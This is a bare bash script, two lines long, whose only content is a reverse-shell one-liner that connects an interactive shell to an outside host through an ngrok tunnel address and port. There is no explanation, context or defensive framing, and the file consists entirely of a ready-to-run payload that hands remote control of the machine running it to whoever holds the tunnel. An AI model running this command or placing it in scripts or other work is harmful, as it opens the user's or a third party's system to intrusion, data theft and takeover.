#!/bin/bash
bash -i >& /dev/tcp/0.tcp.in.ngrok.io/10504 0>&1
